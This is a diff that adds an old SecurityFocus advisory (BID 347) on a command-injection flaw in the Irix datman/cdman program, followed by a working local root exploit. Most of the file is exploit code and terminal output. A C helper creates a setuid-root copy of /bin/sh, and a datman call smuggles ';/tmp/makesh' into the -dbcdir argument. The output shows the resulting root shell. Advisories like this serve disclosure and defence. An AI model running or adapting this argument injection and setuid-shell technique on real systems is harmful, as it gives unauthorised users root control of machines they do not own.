@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/347/info
+
+
+A vulnerability exists in the datman/cdman program, as included with Irix 6.2 and 5.3 from Silicon Graphics Inc. The vulnerability would allow arbitrary users to execute commands as root.
+
+The datman/cdman program will search for the existance of a .cdplayerrc in the users home directory. If it is found, and no .cddb directory is found, cdman will run the cddbcvt program. This program is invoked with the names of both the old and new databases via a system() call. Because of this, it is possible to substitute the names of the database with a command to be executed. 
+
+
+% cat > /tmp/makesh.c
+main()
+{
+seteuid(0); setegid(0);
+system("cp /bin/sh /tmp;chmod a=rsx /tmp/sh");
+}
+% cc /tmp/makesh.c -o /tmp/makesh
+% mv .cddb .cddb.old
+% touch .cdplayerrc
+% /usr/sbin/datman -dbcdir "/tmp/blah;/tmp/makesh"
+Created "/tmp/blah"
+Converting /home/medc2/yuri/.cdplayerrc into /tmp/blah
+% ls -l /tmp/sh
+-r-sr-sr-x 1 root sys 140784 Dec 9 15:24 /tmp/sh* 
